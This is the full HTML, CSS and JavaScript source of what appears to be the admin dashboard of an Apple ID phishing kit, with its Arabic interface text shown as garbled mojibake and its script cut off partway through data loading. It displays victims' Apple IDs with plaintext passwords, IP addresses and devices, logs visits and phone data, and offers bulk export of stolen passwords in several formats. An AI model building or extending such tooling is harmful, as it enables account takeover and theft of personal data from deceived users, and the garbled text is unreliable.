<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="utf-8">
    <title>Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Apple - Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…</title>
    <style>
        :root {
            --primary: #007AFF;
            --primary-dark: #0056CC;
            --success: #34C759;
            --danger: #FF3B30;
            --warning: #FF9500;
            --info: #5AC8FA;
            --dark: #1D1D1F;
            --light: #F5F5F7;
            --gray: #8E8E93;
            --border: #E5E5EA;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
        }
        
        body {
            background: var(--light);
            color: var(--dark);
            line-height: 1.6;
        }
        
        /* Ø§Ù„Ù‡ÙŠØ¯Ø± */
        .dashboard-header {
            background: linear-gradient(135deg, var(--dark), #2C2C2E);
            color: white;
            padding: 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            position: sticky;
            top: 0;
            z-index: 1000;
        }
        
        .header-left {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .live-indicator {
            background: var(--success);
            color: white;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 5px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .header-right {
            display: flex;
            gap: 10px;
        }
        
        /* Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª */
        .stats-container {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            padding: 20px;
        }
        
        .stat-card {
            background: white;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
            text-align: center;
            transition: transform 0.2s;
        }
        
        .stat-card:hover {
            transform: translateY(-5px);
        }
        
        .stat-icon {
            font-size: 32px;
            margin-bottom: 10px;
        }
        
        .stat-number {
            font-size: 32px;
            font-weight: bold;
            color: var(--primary);
        }
        
        .stat-label {
            color: var(--gray);
            margin-top: 5px;
            font-size: 14px;
        }
        
        /* Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª */
        .tabs {
            display: flex;
            border-bottom: 1px solid var(--border);
            margin: 0 20px;
            background: white;
            border-radius: 12px 12px 0 0;
            overflow: hidden;
        }
        
        .tab {
            padding: 15px 30px;
            cursor: pointer;
            border-bottom: 3px solid transparent;
            transition: all 0.2s;
            font-weight: 500;
        }
        
        .tab.active {
            border-bottom-color: var(--primary);
            color: var(--primary);
            background: var(--light);
        }
        
        .tab:hover:not(.active) {
            background: var(--light);
        }
        
        /* Ù…Ø­ØªÙˆÙ‰ Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª */
        .tab-content {
            display: none;
            background: white;
            margin: 0 20px 20px;
            border-radius: 0 0 12px 12px;
            padding: 20px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
        }
        
        .tab-content.active {
            display: block;
        }
        
        /* Ø¬Ø¯Ø§ÙˆÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª */
        .table-container {
            overflow-x: auto;
            max-height: 500px;
            overflow-y: auto;
            margin: 20px 0;
            border: 1px solid var(--border);
            border-radius: 8px;
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 14px;
        }
        
        th, td {
            padding: 12px 15px;
            text-align: right;
            border-bottom: 1px solid var(--border);
        }
        
        th {
            background: var(--light);
            font-weight: 600;
            color: var(--dark);
            position: sticky;
            top: 0;
        }
        
        tr:hover {
            background: var(--light);
        }
        
        /* ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± */
        .password-cell {
            position: relative;
        }
        
        .password-hidden {
            font-family: monospace;
            background: #f8f9fa;
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid var(--border);
        }
        
        .toggle-password {
            background: none;
            border: none;
            color: var(--primary);
            cursor: pointer;
            font-size: 12px;
            margin-right: 5px;
        }
        
        .password-visible {
            display: none;
            background: #fff8e1;
            padding: 8px;
            border-radius: 4px;
            margin-top: 5px;
            font-family: monospace;
            border: 1px solid #ffecb3;
        }
        
        /* ÙÙ„ØªØ±Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª */
        .filter-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 20px;
            padding: 15px;
            background: var(--light);
            border-radius: 8px;
            align-items: center;
        }
        
        .search-input {
            flex: 1;
            padding: 10px 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            font-size: 14px;
        }
        
        .filter-select {
            padding: 10px 15px;
            border: 1px solid var(--border);
            border-radius: 8px;
            background: white;
            font-size: 14px;
            min-width: 150px;
        }
        
        /* Ø§Ù„Ø£Ø²Ø±Ø§Ø± */
        .btn {
            padding: 10px 20px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 500;
            transition: all 0.2s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }
        
        .btn-primary {
            background: var(--primary);
            color: white;
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
        }
        
        .btn-success {
            background: var(--success);
            color: white;
        }
        
        .btn-warning {
            background: var(--warning);
            color: white;
        }
        
        .btn:hover {
            opacity: 0.9;
            transform: translateY(-2px);
        }
        
        /* Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ */
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: var(--success);
            color: white;
            padding: 15px 25px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            display: none;
            z-index: 1001;
            animation: slideUp 0.3s ease;
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(100%);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
        
        /* Ø­Ø§Ù„Ø© ÙØ§Ø±ØºØ© */
        .empty-state {
            text-align: center;
            padding: 40px;
            color: var(--gray);
        }
        
        /* Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ */
        .auto-refresh {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
            padding: 15px;
            background: var(--light);
            border-radius: 8px;
        }
        
        /* Ù…ØªØ§Ø¨Ø¹Ø© Ø§Ù„Ù‡ÙˆØ§ØªÙ */
        .device-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 500;
        }
        
        .device-mobile {
            background: #e3f2fd;
            color: #1976d2;
        }
        
        .device-desktop {
            background: #f3e5f5;
            color: #7b1fa2;
        }
        
        /* Ø¨Ù„Ø§Ø¹Ø© Ø§Ù„Ø£Ù…Ø§Ù† */
        .bluetooth-status {
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 10px;
            background: linear-gradient(135deg, #007AFF, #5AC8FA);
            color: white;
            border-radius: 8px;
            margin-bottom: 20px;
            animation: bluetoothGlow 2s infinite;
        }
        
        @keyframes bluetoothGlow {
            0%, 100% { box-shadow: 0 0 10px rgba(0, 122, 255, 0.3); }
            50% { box-shadow: 0 0 20px rgba(0, 122, 255, 0.6); }
        }
        
        /* ØªØµÙ…ÙŠÙ… Ù…ØªØ¬Ø§ÙˆØ¨ */
        @media (max-width: 768px) {
            .stats-container {
                grid-template-columns: 1fr;
            }
            
            .tabs {
                flex-direction: column;
            }
            
            .tab {
                padding: 12px;
                text-align: center;
            }
            
            .filter-bar {
                flex-direction: column;
            }
            
            .filter-select, .search-input {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <!-- Ø§Ù„Ù‡ÙŠØ¯Ø± -->
    <div class="dashboard-header">
        <div class="header-left">
            <div class="logo">
                <span>ğŸ</span>
                Ù†Ø¸Ø§Ù… Ø¥Ø¯Ø§Ø±Ø© Apple
            </div>
            <div class="live-indicator" id="liveIndicator">
                <span class="dot">â—</span>
                <span id="connectionStatus">Ø¬Ø§Ø±ÙŠ Ø§Ù„Ø§ØªØµØ§Ù„...</span>
            </div>
        </div>
        <div class="header-right">
            <button class="btn btn-primary" onclick="refreshAllData()">
                <span>ğŸ”„</span>
                ØªØ­Ø¯ÙŠØ«
            </button>
            <button class="btn btn-success" onclick="exportAllData()">
                <span>ğŸ“¥</span>
                ØªØµØ¯ÙŠØ±
            </button>
            <button class="btn btn-danger" onclick="clearAllData()">
                <span>ğŸ—‘ï¸</span>
                ØªÙ†Ø¸ÙŠÙ
            </button>
        </div>
    </div>
    
    <!-- Ø¨Ù„Ø§Ø¹Ø© Ø§Ù„Ø£Ù…Ø§Ù† -->
    <div class="bluetooth-status" id="bluetoothStatus">
        <span>ğŸŸ¦</span>
        <span>Ø¨Ù„Ø§Ø¹Ø© Ø§Ù„Ø£Ù…Ø§Ù† Ù†Ø´Ø· - Ø¬Ø§Ø±ÙŠ Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ù‡ÙˆØ§ØªÙ</span>
    </div>
    
    <!-- Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª -->
    <div class="stats-container" id="statsContainer">
        <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
    </div>
    
    <!-- Ø§Ù„ØªØ¨ÙˆÙŠØ¨Ø§Øª -->
    <div class="tabs">
        <div class="tab active" onclick="switchTab('credentials')">ğŸ” Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</div>
        <div class="tab" onclick="switchTab('visits')">ğŸ‘€ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</div>
        <div class="tab" onclick="switchTab('mobile')">ğŸ“± Ø§Ù„Ù‡ÙˆØ§ØªÙ</div>
        <div class="tab" onclick="switchTab('bluetooth')">ğŸŸ¦ Ø¨Ù„Ø§Ø¹Ø©</div>
        <div class="tab" onclick="switchTab('export')">ğŸ“ Ø§Ù„ØªØµØ¯ÙŠØ±</div>
    </div>
    
    <!-- ØªØ¨ÙˆÙŠØ¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„ -->
    <div class="tab-content active" id="tabCredentials">
        <div class="filter-bar">
            <input type="text" class="search-input" placeholder="Ø¨Ø­Ø« Ø¹Ù† Apple ID Ø£Ùˆ IP..." 
                   onkeyup="filterCredentials(this.value)">
            <select class="filter-select" onchange="filterByDevice(this.value)">
                <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</option>
                <option value="mobile">Ø§Ù„Ù‡ÙˆØ§ØªÙ ÙÙ‚Ø·</option>
                <option value="desktop">Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ± ÙÙ‚Ø·</option>
            </select>
            <select class="filter-select" onchange="filterByDate(this.value)">
                <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£ÙˆÙ‚Ø§Øª</option>
                <option value="today">Ø§Ù„ÙŠÙˆÙ…</option>
                <option value="week">Ø§Ù„Ø£Ø³Ø¨ÙˆØ¹</option>
                <option value="month">Ø§Ù„Ø´Ù‡Ø±</option>
            </select>
        </div>
        
        <div class="table-container">
            <table id="credentialsTable">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Ø§Ù„ÙˆÙ‚Øª</th>
                        <th>Apple ID</th>
                        <th>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</th>
                        <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                        <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                        <th>Ø§Ù„Ù…ØªØµÙØ­</th>
                        <th>Ø§Ù„Ø¥Ø¬Ø±Ø§Ø¡Ø§Øª</th>
                    </tr>
                </thead>
                <tbody id="credentialsBody">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                </tbody>
            </table>
        </div>
        
        <div class="empty-state" id="emptyCredentials" style="display: none;">
            Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¯Ø®ÙˆÙ„ Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
        </div>
        
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <button class="btn btn-danger" onclick="deleteAllCredentials()">
                ğŸ—‘ï¸ Ø­Ø°Ù Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            </button>
            <button class="btn btn-success" onclick="exportCredentials()">
                ğŸ“¥ ØªØµØ¯ÙŠØ± ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ±
            </button>
            <button class="btn btn-primary" onclick="refreshCredentials()">
                ğŸ”„ ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¬Ø¯ÙˆÙ„
            </button>
        </div>
    </div>
    
    <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª -->
    <div class="tab-content" id="tabVisits">
        <div class="filter-bar">
            <input type="text" class="search-input" placeholder="Ø¨Ø­Ø« Ø¹Ù† IP Ø£Ùˆ Ù…ØªØµÙØ­..." 
                   onkeyup="filterVisits(this.value)">
            <select class="filter-select" onchange="filterVisitsByDevice(this.value)">
                <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©</option>
                <option value="mobile">Ø§Ù„Ù‡ÙˆØ§ØªÙ ÙÙ‚Ø·</option>
                <option value="desktop">Ø£Ø¬Ù‡Ø²Ø© Ø§Ù„ÙƒÙ…Ø¨ÙŠÙˆØªØ± ÙÙ‚Ø·</option>
            </select>
        </div>
        
        <div class="table-container">
            <table id="visitsTable">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Ø§Ù„ÙˆÙ‚Øª</th>
                        <th>Ø¹Ù†ÙˆØ§Ù† IP</th>
                        <th>Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                        <th>Ø§Ù„Ù…ØªØµÙØ­</th>
                        <th>Ø§Ù„Ø¯Ù‚Ø©</th>
                        <th>Ø§Ù„Ù„ØºØ©</th>
                        <th>Ø§Ù„Ù…ØµØ¯Ø±</th>
                    </tr>
                </thead>
                <tbody id="visitsBody">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                </tbody>
            </table>
        </div>
        
        <div class="empty-state" id="emptyVisits" style="display: none;">
            Ù„Ø§ ØªÙˆØ¬Ø¯ Ø²ÙŠØ§Ø±Ø§Øª Ù…Ø³Ø¬Ù„Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
        </div>
    </div>
    
    <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„Ù‡ÙˆØ§ØªÙ -->
    <div class="tab-content" id="tabMobile">
        <div style="margin-bottom: 20px;">
            <h3>ğŸ“± Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø§Ù„Ø°ÙƒÙŠØ©</h3>
            <p style="color: var(--gray); margin-top: 5px;">
                ÙŠØ¹Ø±Ø¶ Ù‡Ø°Ø§ Ø§Ù„Ù‚Ø³Ù… Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø© Ù…Ù† Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø§Ù„Ø°ÙƒÙŠØ©
            </p>
        </div>
        
        <div class="filter-bar">
            <input type="text" class="search-input" placeholder="Ø¨Ø­Ø« ÙÙŠ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ..." 
                   onkeyup="filterMobileData(this.value)">
            <select class="filter-select" onchange="filterMobileByType(this.value)">
                <option value="">Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</option>
                <option value="credentials">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¯Ø®ÙˆÙ„</option>
                <option value="visits">Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª</option>
                <option value="bluetooth">Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ«</option>
            </select>
        </div>
        
        <div class="table-container">
            <table id="mobileTable">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Ø§Ù„ÙˆÙ‚Øª</th>
                        <th>Ù†ÙˆØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</th>
                        <th>Apple ID</th>
                        <th>ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±</th>
                        <th>Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„</th>
                        <th>Ø·Ø±Ù‚ Ø§Ù„Ø­ÙØ¸</th>
                        <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                    </tr>
                </thead>
                <tbody id="mobileBody">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                </tbody>
            </table>
        </div>
        
        <div class="empty-state" id="emptyMobile" style="display: none;">
            Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ù…Ù† Ø§Ù„Ù‡ÙˆØ§ØªÙ Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
        </div>
        
        <div class="auto-refresh">
            <label>
                <input type="checkbox" id="mobileAutoRefresh" checked>
                Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ
            </label>
            <button class="btn btn-primary" onclick="refreshMobileData()">
                <span>ğŸ”„</span>
                ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¢Ù†
            </button>
        </div>
    </div>
    
    <!-- ØªØ¨ÙˆÙŠØ¨ Ø¨Ù„Ø§Ø¹Ø© -->
    <div class="tab-content" id="tabBluetooth">
        <div style="margin-bottom: 20px;">
            <h3>ğŸŸ¦ Ù†Ø¸Ø§Ù… Ø¨Ù„Ø§Ø¹Ø© Ø§Ù„Ø£Ù…Ø§Ù†</h3>
            <p style="color: var(--gray); margin-top: 5px;">
                ÙŠØ¹Ø±Ø¶ Ù‡Ø°Ø§ Ø§Ù„Ù‚Ø³Ù… Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø¨Ù„ÙˆØªÙˆØ« ÙˆØ§Ù„Ø¥ØªØµØ§Ù„Ø§Øª Ø§Ù„Ù„Ø§Ø³Ù„ÙƒÙŠØ©
            </p>
        </div>
        
        <div class="stats-container" style="grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));">
            <div class="stat-card">
                <div class="stat-icon">ğŸ“¡</div>
                <div class="stat-number" id="bluetoothConnections">0</div>
                <div class="stat-label">Ø§ØªØµØ§Ù„Ø§Øª Ø¨Ù„Ø§Ø¹Ø©</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">ğŸ“±</div>
                <div class="stat-number" id="mobileDevices">0</div>
                <div class="stat-label">Ø£Ø¬Ù‡Ø²Ø© Ù…ÙˆØµÙˆÙ„Ø©</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">ğŸ’¾</div>
                <div class="stat-number" id="bluetoothDataCount">0</div>
                <div class="stat-label">Ø­Ø²Ù… Ø¨ÙŠØ§Ù†Ø§Øª</div>
            </div>
            <div class="stat-card">
                <div class="stat-icon">âš¡</div>
                <div class="stat-number" id="transferSpeed">0</div>
                <div class="stat-label">ÙƒÙŠÙ„ÙˆØ¨Ø§ÙŠØª/Ø«Ø§Ù†ÙŠØ©</div>
            </div>
        </div>
        
        <div class="table-container" style="margin-top: 20px;">
            <table id="bluetoothTable">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Ø§Ù„ÙˆÙ‚Øª</th>
                        <th>Ù†ÙˆØ¹ Ø§Ù„Ø¬Ù‡Ø§Ø²</th>
                        <th>Ù‚ÙˆØ© Ø§Ù„Ø¥Ø´Ø§Ø±Ø©</th>
                        <th>Ø­Ø¬Ù… Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</th>
                        <th>Ù†ÙˆØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</th>
                        <th>Ø§Ù„Ø­Ø§Ù„Ø©</th>
                    </tr>
                </thead>
                <tbody id="bluetoothBody">
                    <!-- Ø³ÙŠØªÙ… Ù…Ù„Ø¤Ù‡Ø§ Ø¨Ø§Ù„Ø¬Ø§ÙØ§Ø³ÙƒØ±ÙŠØ¨Øª -->
                </tbody>
            </table>
        </div>
        
        <div class="empty-state" id="emptyBluetooth" style="display: none;">
            Ù„Ø§ ØªÙˆØ¬Ø¯ Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù„Ø§Ø¹Ø© Ø­ØªÙ‰ Ø§Ù„Ø¢Ù†
        </div>
        
        <div style="display: flex; gap: 10px; margin-top: 20px;">
            <button class="btn btn-primary" onclick="simulateBluetooth()">
                ğŸŸ¦ Ù…Ø­Ø§ÙƒØ§Ø© Ø¨Ù„Ø§Ø¹Ø©
            </button>
            <button class="btn btn-success" onclick="exportBluetoothData()">
                ğŸ“¥ ØªØµØ¯ÙŠØ± Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù„Ø§Ø¹Ø©
            </button>
            <button class="btn btn-warning" onclick="clearBluetoothCache()">
                ğŸ§¹ ØªÙ†Ø¸ÙŠÙ Ø°Ø§ÙƒØ±Ø© Ø¨Ù„Ø§Ø¹Ø©
            </button>
        </div>
    </div>
    
    <!-- ØªØ¨ÙˆÙŠØ¨ Ø§Ù„ØªØµØ¯ÙŠØ± -->
    <div class="tab-content" id="tabExport">
        <div style="margin-bottom: 30px;">
            <h3>ğŸ“ ØªØµØ¯ÙŠØ± Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª</h3>
            <p style="color: var(--gray); margin-top: 5px;">
                ÙŠÙ…ÙƒÙ†Ùƒ ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù…Ø³Ø¬Ù„Ø© Ø¨ØªÙ†Ø³ÙŠÙ‚Ø§Øª Ù…Ø®ØªÙ„ÙØ©
            </p>
        </div>
        
        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 30px;">
            <button class="btn btn-primary" onclick="exportFormat('json')">
                <span>ğŸ”„</span>
                ØªØµØ¯ÙŠØ± ÙƒÙ€ JSON
            </button>
            <button class="btn btn-primary" onclick="exportFormat('csv')">
                <span>ğŸ“Š</span>
                ØªØµØ¯ÙŠØ± ÙƒÙ€ CSV
            </button>
            <button class="btn btn-primary" onclick="exportFormat('txt')">
                <span>ğŸ“</span>
                ØªØµØ¯ÙŠØ± ÙƒÙ€ Ù†Øµ
            </button>
            <button class="btn btn-success" onclick="exportAllFormats()">
                <span>ğŸ“</span>
                ØªØµØ¯ÙŠØ± Ø¬Ù…ÙŠØ¹ Ø§Ù„ØªÙ†Ø³ÙŠÙ‚Ø§Øª
            </button>
        </div>
        
        <div style="margin-bottom: 30px;">
            <h4>ØªØµØ¯ÙŠØ± Ø¬Ø²Ø¦ÙŠ</h4>
            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-top: 15px;">
                <button class="btn btn-warning" onclick="exportCredentialsOnly()">
                    <span>ğŸ”</span>
                    ÙƒÙ„Ù…Ø§Øª Ø§Ù„Ù…Ø±ÙˆØ± ÙÙ‚Ø·
                </button>
                <button class="btn btn-warning" onclick="exportVisitsOnly()">
                    <span>ğŸ‘€</span>
                    Ø§Ù„Ø²ÙŠØ§Ø±Ø§Øª ÙÙ‚Ø·
                </button>
                <button class="btn btn-warning" onclick="exportMobileOnly()">
                    <span>ğŸ“±</span>
                    Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ù‡ÙˆØ§ØªÙ ÙÙ‚Ø·
                </button>
                <button class="btn btn-warning" onclick="exportBluetoothOnly()">
                    <span>ğŸŸ¦</span>
                    Ø¨ÙŠØ§Ù†Ø§Øª Ø¨Ù„Ø§Ø¹Ø© ÙÙ‚Ø·
                </button>
            </div>
        </div>
        
        <div>
            <h4>Ø®ÙŠØ§Ø±Ø§Øª Ù…ØªÙ‚Ø¯Ù…Ø©</h4>
            <div style="display: flex; flex-direction: column; gap: 15px; margin-top: 15px;">
                <div>
                    <label style="display: block; margin-bottom: 5px;">Ù†Ø·Ø§Ù‚ Ø§Ù„ØªØ§Ø±ÙŠØ®:</label>
                    <div style="display: flex; gap: 10px;">
                        <input type="date" id="exportStartDate" style="padding: 10px; border: 1px solid var(--border); border-radius: 8px;">
                        <input type="date" id="exportEndDate" style="padding: 10px; border: 1px solid var(--border); border-radius: 8px;">
                        <button class="btn btn-info" onclick="exportByDate()">
                            ØªØµØ¯ÙŠØ± Ø¨Ø§Ù„Ù†Ø·Ø§Ù‚
                        </button>
                    </div>
                </div>
                
                <div>
                    <label style="display: block; margin-bottom: 5px;">Ø®ÙŠØ§Ø±Ø§Øª Ø§Ù„ØªØµØ¯ÙŠØ±:</label>
                    <div style="display: flex; gap: 15px; flex-wrap: wrap;">
                        <label>
                            <input type="checkbox" id="exportEncrypt" checked>
                            ØªØ´ÙÙŠØ± Ø§Ù„Ù…Ù„ÙØ§Øª
                        </label>
                        <label>
                            <input type="checkbox" id="exportCompress" checked>
                            Ø¶ØºØ· Ø§Ù„Ù…Ù„ÙØ§Øª
                        </label>
                        <label>
                            <input type="checkbox" id="exportSplit" checked>
                            ØªÙ‚Ø³ÙŠÙ… Ø§Ù„Ù…Ù„ÙØ§Øª Ø§Ù„ÙƒØ¨ÙŠØ±Ø©
                        </label>
                    </div>
                </div>
                
                <div>
                    <button class="btn btn-danger" onclick="createBackup()">
                        ğŸ’¾ Ø¥Ù†Ø´Ø§Ø¡ Ù†Ø³Ø®Ø© Ø§Ø­ØªÙŠØ§Ø·ÙŠØ© ÙƒØ§Ù…Ù„Ø©
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Ø§Ù„Ø±Ø³Ø§Ø¦Ù„ -->
    <div class="notification" id="notification"></div>

    <script>
        // Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        let allCredentials = [];
        let allVisits = [];
        let mobileData = [];
        let bluetoothData = [];
        let currentTab = 'credentials';
        let refreshInterval = null;
        
        // ØªÙ‡ÙŠØ¦Ø© Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…
        document.addEventListener('DOMContentLoaded', async function() {
            console.log('ğŸš€ Ø¨Ø¯Ø¡ ØªÙ‡ÙŠØ¦Ø© Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…...');
            
            // ØªØ­Ù…ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
            await loadAllData();
            
            // ØªØ­Ø¯ÙŠØ« Ø§Ù„Ø¥Ø­ØµØ§Ø¦ÙŠØ§Øª
            updateStats();
            
            // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ø¯ÙŠØ« Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ
            startAutoRefresh();
            
            // Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª Ø§Ù„Ù…Ø¨Ø§Ø´Ø±Ø©
            setupRealTimeListeners();
            
            // Ù…Ø­Ø§ÙƒØ§Ø© Ø¨Ù„Ø§Ø¹Ø©
            simulateBluetoothData();
            
            console.log('âœ… Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¹Ù…Ù„');
            showNotification('Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ… Ø¬Ø§Ù‡Ø²Ø© Ù„Ù„Ø¹Ù…Ù„', 'success');
        });
        
        // ØªØ­Ù…ÙŠÙ„ Ø¬Ù…ÙŠØ¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
        async function loadAllData() {
            try {
                // ØªØ­Ù…ÙŠÙ„ Ù…Ù† Ù…ØµØ§Ø¯Ø± Ù…ØªØ¹Ø¯Ø¯Ø©
                await Promise.all([
                    loadCredentials(),
                    loadVisits(),
                    loadMobileData(),
                    loadBluetoothData()
                ]);
                
            } catch (error) {
                console.error('âŒ Ø®Ø·Ø£ ÙÙŠ ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:', error);
